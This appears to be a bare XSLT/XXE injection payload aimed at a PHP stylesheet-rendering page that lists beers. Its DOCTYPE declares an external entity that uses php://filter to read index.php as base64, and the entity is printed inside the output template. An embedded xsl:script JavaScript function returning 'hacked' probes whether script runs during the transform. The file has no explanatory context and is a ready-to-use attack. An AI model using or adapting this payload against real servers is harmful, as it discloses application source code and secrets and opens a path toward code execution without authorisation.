<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:for-each select="beers/beer">
  <div style="background-color:teal;color:white;padding:4px">
    <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
      ========= &xxe; =========
      <xsl:script
    implements-prefix="date"
    language="javascript">
    
    function clock() {
      return "hacked";
   }
   
  </xsl:script>  
  <xsl:template match="/">
    <xsl:value-of select="date:clock()"/>
  </xsl:template>
        
    <xsl:value-of select="@directory"/>
    </div>
  <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
    <p>
    <xsl:value-of select="description"/>
    <span style="font-style:italic"> (<xsl:value-of select='prct'/> %)</span>
    </p>
  </div>
</xsl:for-each>
</body>
</html> 